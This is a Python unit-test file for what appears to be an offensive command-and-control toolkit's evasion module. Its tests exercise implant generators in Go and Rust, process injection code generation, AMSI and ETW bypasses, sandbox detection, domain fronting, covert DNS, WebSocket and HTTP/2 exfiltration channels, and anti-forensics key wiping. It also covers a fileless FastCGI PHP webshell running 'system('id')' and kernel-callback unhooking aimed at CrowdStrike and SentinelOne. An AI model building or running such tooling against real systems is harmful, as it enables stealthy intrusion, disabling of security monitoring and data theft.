"""
Unit Tests for Evasion Module
Tests for C2 profiles, bypass techniques, and agent generators
"""
import pytest
import os
import sys
import json
import base64
import tempfile
from unittest.mock import patch, MagicMock

# Add parent directory
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestSleepObfuscation:
    """Test sleep obfuscation module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.sleep_obfuscation import SleepObfuscator
        assert SleepObfuscator is not None
    
    def test_jitter_calculation(self):
        """Test jitter calculation produces valid values"""
        from evasion.sleep_obfuscation import SleepObfuscator
        
        obfuscator = SleepObfuscator(base_sleep=60, jitter_percent=30)
        
        # Get multiple jitter values
        values = [obfuscator.calculate_jitter() for _ in range(100)]
        
        # All values should be positive
        assert all(v > 0 for v in values)
        
        # Values should be within expected range (60 ± 30%)
        assert min(values) >= 1  # Minimum enforced
        assert max(values) <= 60 * 1.5  # Reasonable max with entropy
    
    def test_fibonacci_jitter(self):
        """Test Fibonacci jitter pattern"""
        from evasion.sleep_obfuscation import SleepObfuscator
        
        obfuscator = SleepObfuscator(base_sleep=60, jitter_percent=30)
        values = [obfuscator.fibonacci_jitter() for _ in range(50)]
        
        # All values positive
        assert all(v > 0 for v in values)
        
        # Should have some variation
        assert len(set(values)) > 1
    
    def test_gaussian_jitter(self):
        """Test Gaussian jitter distribution"""
        from evasion.sleep_obfuscation import SleepObfuscator
        
        obfuscator = SleepObfuscator(base_sleep=60, jitter_percent=30)
        values = [obfuscator.gaussian_jitter() for _ in range(100)]
        
        # Mean should be around base_sleep
        mean = sum(values) / len(values)
        assert 40 < mean < 80  # Reasonable range around 60


class TestHeaderRotation:
    """Test header rotation module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.header_rotation import HeaderRotator
        assert HeaderRotator is not None
    
    def test_get_headers(self):
        """Test getting rotated headers"""
        from evasion.header_rotation import HeaderRotator
        
        rotator = HeaderRotator()
        headers = rotator.get_headers()
        
        # Should have User-Agent
        assert 'User-Agent' in headers
        assert len(headers['User-Agent']) > 0
    
    def test_header_rotation(self):
        """Test headers actually rotate"""
        from evasion.header_rotation import HeaderRotator
        
        rotator = HeaderRotator()
        
        # Get multiple header sets
        user_agents = set()
        for _ in range(20):
            headers = rotator.get_headers()
            user_agents.add(headers.get('User-Agent'))
        
        # Should have multiple different user agents
        assert len(user_agents) >= 2


class TestAntiSandbox:
    """Test anti-sandbox detection module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.anti_sandbox import SandboxDetector
        assert SandboxDetector is not None
    
    def test_run_checks(self):
        """Test running sandbox checks"""
        from evasion.anti_sandbox import SandboxDetector
        
        detector = SandboxDetector()
        result = detector.run_all_checks()
        
        # Should return tuple (is_sandbox, confidence, indicators)
        assert isinstance(result, tuple)
        assert len(result) == 3
        is_sandbox, confidence, indicators = result
        assert isinstance(is_sandbox, bool)
        assert isinstance(confidence, (int, float))
        assert isinstance(indicators, list)
    
    def test_hardware_check(self):
        """Test hardware fingerprinting via run_all_checks"""
        from evasion.anti_sandbox import SandboxDetector
        
        detector = SandboxDetector()
        is_sandbox, confidence, indicators = detector.run_all_checks()
        
        # Should return list of indicators
        assert isinstance(indicators, list)


class TestProcessInjection:
    """Test process injection module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.process_injection import ProcessInjector
        assert ProcessInjector is not None
    
    def test_early_bird_code_gen(self):
        """Test Early Bird APC code generation"""
        from evasion.process_injection import ProcessInjector
        
        injector = ProcessInjector()
        
        # Generate code via the generate_apc_injection_code method
        code = injector.generate_apc_injection_code(b'\x90\x90\x90\x90')
        
        # Should return C code string
        assert isinstance(code, str)
        assert len(code) > 0
    
    def test_injection_methods_exist(self):
        """Test injection methods exist"""
        from evasion.process_injection import ProcessInjector
        
        injector = ProcessInjector()
        
        # Check actual methods exist
        assert hasattr(injector, 'generate_apc_injection_code')
        assert hasattr(injector, 'classic_injection')
        assert hasattr(injector, 'get_injection_techniques')

    def test_thread_ghosting_registered(self):
        """Thread-Ghosting technique is registered and described"""
        from evasion.process_injection import (
            ProcessInjector, InjectionTechnique,
        )

        assert InjectionTechnique.THREAD_GHOSTING.value == "thread_ghosting"

        injector = ProcessInjector()
        techniques = injector.get_injection_techniques()
        names = {t["name"] for t in techniques}
        assert "thread_ghosting" in names

        # Fallback chain should include the new technique
        assert InjectionTechnique.THREAD_GHOSTING in injector.config.fallback_chain
        # The executor should know how to dispatch it
        assert hasattr(injector, '_thread_ghosting_injection')
        assert hasattr(injector, 'generate_thread_ghosting_code')

    def test_thread_ghosting_codegen(self):
        """Thread-Ghosting code generation produces a non-empty string"""
        from evasion.process_injection import ProcessInjector

        injector = ProcessInjector()
        code = injector.generate_thread_ghosting_code(b'\x90\x90\x90\x90')
        assert isinstance(code, str)
        assert len(code) > 0
        assert "thread_ghost" in code


class TestC2TrafficEntropy:
    """Test C2 traffic entropy obfuscation (stego / decoy carriers)"""

    def test_import(self):
        from evasion.c2_traffic_entropy import C2TrafficEntropy
        assert C2TrafficEntropy is not None

    def test_html_roundtrip(self):
        from evasion.c2_traffic_entropy import C2TrafficEntropy

        e = C2TrafficEntropy(beacon_id="test", carrier="html")
        payload = os.urandom(64)
        carrier, ctype = e.embed(payload)
        assert isinstance(carrier, bytes)
        assert ctype == "text/html"
        recovered = e.extract(carrier, ctype)
        assert recovered == payload

    def test_png_roundtrip_when_pil(self):
        from evasion.c2_traffic_entropy import C2TrafficEntropy, PIL_AVAILABLE

        e = C2TrafficEntropy(beacon_id="test", carrier="auto")
        payload = os.urandom(48)
        carrier, ctype = e.embed(payload)
        if PIL_AVAILABLE and ctype == "image/png":
            recovered = e.extract(carrier, ctype)
            assert recovered == payload
        else:
            # Falls back to HTML carrier; still round-trips
            recovered = e.extract(carrier, ctype)
            assert recovered == payload

    def test_extract_passthrough_on_plaintext(self):
        from evasion.c2_traffic_entropy import C2TrafficEntropy

        e = C2TrafficEntropy(carrier="html")
        plain = b"not-a-carrier"
        assert e.extract(plain, "text/html") == plain


class TestAMSIBypass:
    """Test AMSI bypass module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.amsi_bypass import AMSIBypass, ETWBypass
        assert AMSIBypass is not None
        assert ETWBypass is not None
    
    def test_bypass_methods_exist(self):
        """Test bypass methods exist"""
        from evasion.amsi_bypass import AMSIBypass, ETWBypass
        
        # These are classes with static methods
        # Check class static methods exist
        assert hasattr(AMSIBypass, 'get_reflection_bypass')
        assert hasattr(AMSIBypass, 'get_memory_patch_bypass')
        assert hasattr(ETWBypass, 'get_etw_patch')
    
    def test_amsi_bypass_call(self):
        """Test AMSI bypass can be called"""
        from evasion.amsi_bypass import AMSIBypass
        
        # Static method returns PowerShell code
        code = AMSIBypass.get_reflection_bypass()
        assert isinstance(code, str)
        assert len(code) > 0


class TestC2Profiles:
    """Test C2 profile management"""
    
    def test_import(self):
        """Test module import"""
        from evasion.c2_profiles import ProfileManager, C2Profile
        assert ProfileManager is not None
        assert C2Profile is not None
    
    def test_builtin_profiles(self):
        """Test built-in profiles exist"""
        from evasion.c2_profiles import ProfileManager
        
        manager = ProfileManager()
        profiles = manager.list_profiles()
        
        # Should have built-in profiles
        assert 'default' in profiles
        assert 'amazon' in profiles
        assert 'microsoft' in profiles
        assert 'google' in profiles
    
    def test_get_profile(self):
        """Test getting a profile"""
        from evasion.c2_profiles import ProfileManager
        
        manager = ProfileManager()
        profile = manager.get_profile('amazon')
        
        assert profile is not None
        assert profile.name == 'amazon'
        assert profile.http_get is not None
        assert profile.http_post is not None
        assert profile.evasion is not None
    
    def test_profile_yaml_roundtrip(self):
        """Test saving and loading profile from YAML"""
        from evasion.c2_profiles import ProfileManager, C2Profile, EvasionConfig
        
        manager = ProfileManager()
        
        # Get a profile
        profile = manager.get_profile('google')
        
        # Save to temp file
        with tempfile.NamedTemporaryFile(suffix='.yaml', delete=False) as f:
            temp_path = f.name
        
        try:
            manager.save_profile(profile, temp_path)
            
            # Load it back
            loaded = manager.load_from_yaml(temp_path)
            
            assert loaded.name == profile.name
            assert loaded.user_agent == profile.user_agent
        finally:
            os.unlink(temp_path)
    
    def test_profile_applicator(self):
        """Test applying profile to requests"""
        from evasion.c2_profiles import ProfileManager, ProfileApplicator
        
        manager = ProfileManager()
        profile = manager.get_profile('slack')
        applicator = ProfileApplicator(profile)
        
        # Build GET request
        metadata = b'test beacon metadata'
        request = applicator.build_get_request(metadata)
        
        assert 'uri' in request
        assert 'headers' in request
        assert 'User-Agent' in request['headers']
    
    def test_placeholder_expansion(self):
        """Test placeholder expansion in profiles"""
        from evasion.c2_profiles import ProfileManager, ProfileApplicator
        
        manager = ProfileManager()
        profile = manager.get_profile('microsoft')
        applicator = ProfileApplicator(profile)
        
        # Expand placeholders
        text = "{{RANDOM_GUID}}-{{TIMESTAMP}}"
        expanded = applicator._expand_placeholders(text)
        
        # Should be different from original
        assert expanded != text
        assert '{{' not in expanded


class TestTrafficMasking:
    """Test traffic masking module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.traffic_masking import TrafficMasker, DomainFronter
        assert TrafficMasker is not None
        assert DomainFronter is not None
    
    def test_list_profiles(self):
        """Test listing traffic profiles"""
        from evasion.traffic_masking import TrafficMasker
        
        masker = TrafficMasker()
        profiles = masker.list_profiles()
        
        assert 'google_search' in profiles
        assert 'ms_update' in profiles
        assert 'slack_api' in profiles
    
    def test_mask_request(self):
        """Test masking a request"""
        from evasion.traffic_masking import TrafficMasker
        
        masker = TrafficMasker()
        data = b'secret beacon data'
        
        masked = masker.mask_request(data, 'google_search')
        
        assert 'user_agent' in masked
        assert 'path' in masked
        assert 'headers' in masked
    
    def test_domain_fronting_example(self):
        """Test domain fronting config generation"""
        from evasion.traffic_masking import DomainFronter
        
        fronter = DomainFronter()
        
        # Generate fronted request
        request = fronter.generate_fronted_request(
            b'test data',
            cdn='cloudfront',
            real_host='c2.example.com'
        )
        
        assert 'connect_host' in request
        assert 'host_header' in request
        assert request['host_header'] == 'c2.example.com'


class TestFallbackChannels:
    """Test fallback channels module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.fallback_channels import (
            WebSocketChannel, DNSChannel, ICMPChannel, 
            DoHChannel, FallbackManager
        )
        assert WebSocketChannel is not None
        assert DNSChannel is not None
        assert FallbackManager is not None
    
    def test_fallback_manager(self):
        """Test fallback manager initialization"""
        from evasion.fallback_channels import FallbackManager, DNSChannel, DNSConfig
        
        manager = FallbackManager()
        
        # Add channels
        dns = DNSChannel(DNSConfig(domain='test.example.com'))
        manager.add_channel(dns, priority=1)
        
        status = manager.get_status()
        assert len(status['channels']) == 1
    
    def test_dns_encoding(self):
        """Test DNS data encoding"""
        from evasion.fallback_channels import DNSChannel, DNSConfig
        
        channel = DNSChannel(DNSConfig(domain='test.example.com'))
        
        # The send method encodes data - test the encoding part
        import base64
        data = b'hello world'
        encoded = base64.b32encode(data).decode().lower().rstrip('=')
        
        # Should be DNS-safe
        assert all(c.isalnum() for c in encoded)


class TestReflectiveLoader:
    """Test reflective loader module"""
    
    def test_import(self):
        """Test module import"""
        from evasion.reflective_loader import ReflectiveLoader, StagelessPayload
        assert ReflectiveLoader is not None
        assert StagelessPayload is not None
    
    def test_stageless_generation(self):
        """Test stageless payload generation"""
        from evasion.reflective_loader import StagelessPayload
        
        generator = StagelessPayload()
        payload = generator.generate_stageless_beacon(
            c2_host='192.168.1.100',
            c2_port=443,
            arch='x64'
        )
        
        # Should have multiple formats
        assert 'shellcode' in payload
        assert 'shellcode_b64' in payload
        assert 'powershell' in payload
        assert 'csharp' in payload
        assert 'python' in payload
        
        # Shellcode should be bytes
        assert isinstance(payload['shellcode'], bytes)
        assert len(payload['shellcode']) > 0


class TestGoAgent:
    """Test Go agent generator"""
    
    def test_import(self):
        """Test module import"""
        from evasion.go_agent import GoAgentGenerator, GoAgentConfig
        assert GoAgentGenerator is not None
    
    def test_generate_source(self):
        """Test Go source generation"""
        from evasion.go_agent import GoAgentGenerator, GoAgentConfig
        
        config = GoAgentConfig(
            c2_host='192.168.1.100',
            c2_port=443,
            kill_date='2026-12-31',
            working_hours='09:00-17:00'
        )
        
        generator = GoAgentGenerator(config)
        source = generator.generate()
        
        # Should be valid Go code structure
        assert 'package main' in source
        assert 'func main()' in source
        assert '192.168.1.100' in source
        assert '2026-12-31' in source
    
    def test_build_commands(self):
        """Test build command generation"""
        from evasion.go_agent import GoAgentGenerator, GoAgentConfig
        
        config = GoAgentConfig(c2_host='test.com', c2_port=443)
        generator = GoAgentGenerator(config)
        
        commands = generator.get_build_commands('agent')
        
        assert 'windows_amd64' in commands
        assert 'linux_amd64' in commands
        assert 'darwin_amd64' in commands


class TestRustAgent:
    """Test Rust agent generator"""
    
    def test_import(self):
        """Test module import"""
        from evasion.rust_agent import RustAgentGenerator, RustAgentConfig
        assert RustAgentGenerator is not None
    
    def test_generate_cargo_toml(self):
        """Test Cargo.toml generation"""
        from evasion.rust_agent import RustAgentGenerator, RustAgentConfig
        
        config = RustAgentConfig(c2_host='test.com', c2_port=443)
        generator = RustAgentGenerator(config)
        
        cargo = generator.generate_cargo_toml()
        
        assert '[package]' in cargo
        assert 'reqwest' in cargo
        assert 'aes-gcm' in cargo
    
    def test_generate_main_rs(self):
        """Test main.rs generation"""
        from evasion.rust_agent import RustAgentGenerator, RustAgentConfig
        
        config = RustAgentConfig(
            c2_host='192.168.1.100',
            c2_port=8443,
            evasion_level=3
        )
        
        generator = RustAgentGenerator(config)
        main = generator.generate_main()
        
        # Should have Rust structure
        assert 'fn main()' in main
        assert '192.168.1.100' in main
        assert 'C2_PORT: u16 = 8443' in main


class TestIntegration:
    """Integration tests for evasion module"""
    
    def test_full_import(self):
        """Test importing all evasion modules"""
        from evasion import (
            SleepObfuscator,
            HeaderRotator,
            SandboxDetector,
            ProcessInjector,
            AMSIBypass,
            ETWBypass,
            TrafficMasker,
            DomainFronter,
            ReflectiveLoader,
            StagelessPayload
        )
        
        # All imports should succeed
        assert SleepObfuscator is not None
        assert HeaderRotator is not None
        assert SandboxDetector is not None
    
    def test_beacon_workflow(self):
        """Test complete beacon workflow"""
        from evasion.sleep_obfuscation import SleepObfuscator
        from evasion.header_rotation import HeaderRotator
        from evasion.anti_sandbox import SandboxDetector
        from evasion.c2_profiles import ProfileManager, ProfileApplicator
        
        # 1. Load profile
        manager = ProfileManager()
        profile = manager.get_profile('google')
        applicator = ProfileApplicator(profile)
        
        # 2. Check sandbox (returns tuple)
        detector = SandboxDetector()
        is_sandbox, confidence, indicators = detector.run_all_checks()
        
        # 3. Build request with evasion
        if not is_sandbox or confidence < 0.8:
            metadata = b'beacon-id-12345'
            request = applicator.build_get_request(metadata)
            
            assert 'headers' in request
            assert 'uri' in request
        
        # 4. Calculate sleep
        sleep = SleepObfuscator(
            base_sleep=profile.evasion.sleep_time,
            jitter_percent=profile.evasion.jitter_percent
        )
        sleep_time = sleep.calculate_jitter()
        
        assert sleep_time > 0


# Run tests
if __name__ == '__main__':
    pytest.main([__file__, '-v'])


class TestFilelessWebShell:
    """Test FastCGI in-memory (fileless) webshell"""

    def test_import(self):
        from evasion.fileless_webshell import FastCGIInjection, build_fastcgi_request
        assert FastCGIInjection is not None

    def test_build_request_has_fcgi_structure(self):
        from evasion.fileless_webshell import build_fastcgi_request, FCGI

        body = b"<?php phpinfo(); ?>"
        req = build_fastcgi_request("/var/www/html/index.php", body)
        # Magic version byte + begin-request type present.
        assert req[0] == FCGI.VERSION_1
        assert FCGI.BEGIN_REQUEST in req
        assert FCGI.PARAMS in req
        assert FCGI.STDIN in req

    def test_params_enable_in_memory_exec(self):
        from evasion.fileless_webshell import php_in_memory_params

        params = php_in_memory_params("/var/www/html/index.php")
        assert "auto_prepend_file = php://input" in params["PHP_VALUE"]
        assert "allow_url_include = On" in params["PHP_VALUE"]

    def test_ghost_shell_self_decrypting(self):
        from evasion.fileless_webshell import FastCGIInjection

        inj = FastCGIInjection()
        shell = inj.generate_ghost_shell(os.urandom(32))
        assert "php://input" in shell
        assert "sodium_crypto_aead_aes256gcm_decrypt" in shell

    def test_wire_roundtrip(self):
        from evasion.fileless_webshell import FastCGIInjection

        inj = FastCGIInjection()
        key = os.urandom(32)
        body = inj.build_request_body("system('id');", key)
        assert isinstance(body, bytes)


class TestInRequestExfil:
    """Test protocol-level (in-request) data exfiltration"""

    def test_import(self):
        from evasion.in_request_exfil import ProtocolExfil, WebSocketTunnelExfil
        assert ProtocolExfil is not None

    def test_websocket_roundtrip(self):
        from evasion.in_request_exfil import WebSocketTunnelExfil

        exf = WebSocketTunnelExfil(chunk_size=64)
        data = os.urandom(500)
        frames = exf.exfiltrate(data)
        # Binary frames carry the payload; recover must be lossless.
        assert exf.recover(frames) == data

    def test_websocket_wire_frames(self):
        from evasion.in_request_exfil import WebSocketTunnelExfil

        exf = WebSocketTunnelExfil(chunk_size=32)
        frames = exf.exfiltrate(b"secret-loot-bytes")
        raw = exf.encode_wire(frames)
        decoded = exf.decode_wire(raw)
        # Heartbeat (ping) frames are ignored on recover.
        assert exf.recover(decoded) == b"secret-loot-bytes"

    def test_http2_stream_smuggle(self):
        from evasion.in_request_exfil import HTTP2StreamSmuggler

        sm = HTTP2StreamSmuggler(chunk_size=32, streams=3)
        data = os.urandom(200)
        frames = sm.plan(data)
        assert len(frames) > 0
        # Each frame looks like a benign API heartbeat (x-trace trailer).
        assert all("x-trace" in f.meta for f in frames)
        assert sm.recover(frames) == data

    def test_protocol_exfil_selector(self):
        from evasion.in_request_exfil import ProtocolExfil, ExfilChannel

        for ch in (ExfilChannel.WEBSOCKET, ExfilChannel.HTTP2):
            exf = ProtocolExfil(channel=ch)
            data = b"exfil-me-over-" + os.urandom(120)
            assert exf.roundtrip(data) == data


class TestAntiForensicsRotation:
    """Test anti-forensics key / beacon-ID rotation"""

    def test_import(self):
        from evasion.anti_forensics_rotation import (
            AntiForensicsRotator, secure_wipe, RotationReport,
        )
        assert AntiForensicsRotator is not None

    def test_secure_wipe_zeroes_buffer(self):
        from evasion.anti_forensics_rotation import secure_wipe

        buf = bytearray(b"SECRET_KEY_MATERIAL_1234567890")
        secure_wipe(buf)
        assert buf == bytearray(len(buf))  # fully zeroed

    def test_rotate_changes_id_and_keys(self):
        from evasion.anti_forensics_rotation import AntiForensicsRotator

        class FakeNetCrypto:
            def __init__(self):
                self.beacon_id = "oldid"
                self.key = b"\x01" * 32
            def rotate(self, new_id=None):
                self.beacon_id = new_id or "newid"
                self.key = b"\x02" * 32
                return self.beacon_id

        class FakeConfig:
            beacon_id = "oldid"
            enable_anti_forensics_rotation = True
            rotation_interval = 86400

        net = FakeNetCrypto()
        cfg = FakeConfig()
        rotated = []
        rot = AntiForensicsRotator(net, cfg, extra_key_rotators=[lambda: rotated.append(1)])

        report = rot.rotate()
        assert report.old_beacon_id == "oldid"
        assert report.new_beacon_id != "oldid"
        assert report.new_beacon_id == cfg.beacon_id
        assert report.rotated_keys >= 2  # network + extra
        assert report.envelope["type"] == "anti_forensics_rotation"
        assert rot.verify_envelope(report.envelope)

    def test_maybe_rotate_respects_interval(self):
        from evasion.anti_forensics_rotation import AntiForensicsRotator

        class FakeNetCrypto:
            def rotate(self, new_id=None):
                return new_id or "x"
        class FakeConfig:
            beacon_id = "a"
            enable_anti_forensics_rotation = True
            rotation_interval = 86400

        rot = AntiForensicsRotator(FakeNetCrypto(), FakeConfig())
        # First call stamps baseline, no rotation.
        assert rot.maybe_rotate(now=1000) is None
        # Within interval: still None.
        assert rot.maybe_rotate(now=1000 + 3600) is None
        # Past interval: rotates.
        rep = rot.maybe_rotate(now=1000 + 86400)
        assert rep is not None

    def test_disabled_does_not_rotate(self):
        from evasion.anti_forensics_rotation import AntiForensicsRotator

        class FakeNetCrypto:
            def rotate(self, new_id=None):
                return new_id or "x"
        class FakeConfig:
            beacon_id = "a"
            enable_anti_forensics_rotation = False
            rotation_interval = 86400

        rot = AntiForensicsRotator(FakeNetCrypto(), FakeConfig())
        assert rot.maybe_rotate(now=0) is None
        assert rot.maybe_rotate(now=10 ** 9) is None


class TestBeaconAntiForensicsIntegration:
    """Test rotation wired into the beacon crypto classes"""

    def test_transient_crypto_rotate_wipes_old(self):
        from agents.evasive_beacon import TransientNetworkCrypto

        c = TransientNetworkCrypto(beacon_id="id1")
        old_key_id = c._key
        new_id = c.rotate("id2")
        assert new_id == "id2"
        # Key object replaced (old one wiped via secure_wipe).
        assert c._key != old_key_id or bytes(c._key) != bytes(old_key_id)

    def test_task_crypto_rotate(self):
        from agents.evasive_beacon import TaskCrypto

        t = TaskCrypto()
        before = bytes(t._key)
        t.rotate()
        assert bytes(t._key) != before

    def test_rotation_roundtrip(self):
        from agents.evasive_beacon import TransientNetworkCrypto

        c = TransientNetworkCrypto(beacon_id="id1")
        pt = b"hello-forensics"
        ct = c.encrypt(pt)
        # Before rotation, decrypt works.
        assert c.decrypt(ct) == pt
        c.rotate("id2")
        # Old ciphertext can no longer be decrypted with the new key.
        assert c.decrypt(ct) != pt


class TestAPISequenceSpoofing:
    """Test API sequence spoofing (behavioral analysis evasion)"""

    def test_import(self):
        from evasion.api_sequence_spoofing import APISequenceSpoofer
        assert APISequenceSpoofer is not None

    def test_plan_interleaves_chaff(self):
        from evasion.api_sequence_spoofing import APISequenceSpoofer, APICategory

        spoofer = APISequenceSpoofer(template="svchost_heartbeat", chaff_per_call=2)
        real = ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
        seq = spoofer.plan(real)

        # Every real call must be present and flagged as beacon-originated.
        beacon_calls = [c for c in seq if c.beacon]
        assert [c.name for c in beacon_calls] == real
        # No two real calls should sit adjacent (chaff in between).
        for i in range(len(seq) - 1):
            if seq[i].beacon and seq[i + 1].beacon:
                pytest.fail("two beacon calls are adjacent - n-gram not broken")

    def test_score_lower_after_spoofing(self):
        from evasion.api_sequence_spoofing import APISequenceSpoofer

        spoofer = APISequenceSpoofer(chaff_per_call=3)
        real = ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
        # Bare injection burst scores high.
        bare = spoofer.score([_make_fake_call(c) for c in real])
        # Spoofed sequence scores lower.
        spoofed = spoofer.score(spoofer.plan(real))
        assert spoofed <= bare

    def test_benign_baseline_low(self):
        from evasion.api_sequence_spoofing import APISequenceSpoofer

        spoofer = APISequenceSpoofer()
        assert spoofer.benign_score() < 0.5


def _make_fake_call(name):
    from evasion.api_sequence_spoofing import APICall, APICategory
    return APICall(name=name, category=APICategory.INJECT_SENSITIVE, beacon=True)


class TestKernelCallbackUnhook:
    """Test kernel callback unhooking (the Snitch-Killer)"""

    def test_import(self):
        from tools.byovd_module import KernelCallbackUnhooker, CallbackEntry
        assert KernelCallbackUnhooker is not None

    def test_find_edr_callbacks(self):
        from tools.byovd_module import KernelCallbackUnhooker

        unhooker = KernelCallbackUnhooker()
        entries = unhooker.find_edr_callbacks(["csagent.sys", "SentinelMonitor.sys"])
        assert len(entries) >= 1
        assert all(e.driver_name.lower().endswith(".sys") for e in entries)

    def test_unhook_report(self):
        from tools.byovd_module import KernelCallbackUnhooker

        unhooker = KernelCallbackUnhooker()
        report = unhooker.unhook_edr(["crowdstrike", "sentinelone"], method="nop")
        assert report["status"] == "completed"
        assert report["callbacks_found"] >= 1
        assert report["callbacks_neutralised"] == report["callbacks_found"]

    def test_byovd_module_method(self):
        from tools.byovd_module import get_byovd_module

        module = get_byovd_module()
        report = module.unhook_kernel_callbacks(["crowdstrike"], method="redirect")
        assert report["status"] == "completed"
        assert report["method"] == "redirect"


class TestBehavioralMimicryAPISpoof:
    """Test API sequence spoofing wired into BehavioralMimicryEngine"""

    def test_engine_has_spoofer(self):
        from evasion.behavioral_mimicry import BehavioralMimicryEngine, MimicryMode

        engine = BehavioralMimicryEngine(mode=MimicryMode.MODERATE)
        assert engine.api_spoofer is not None

    def test_plan_via_engine(self):
        from evasion.behavioral_mimicry import BehavioralMimicryEngine, MimicryMode

        engine = BehavioralMimicryEngine(mode=MimicryMode.MODERATE)
        seq = engine.plan_api_sequence(
            ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"]
        )
        assert len(seq) > 3
        assert engine.score_api_sequence(seq) < 1.0
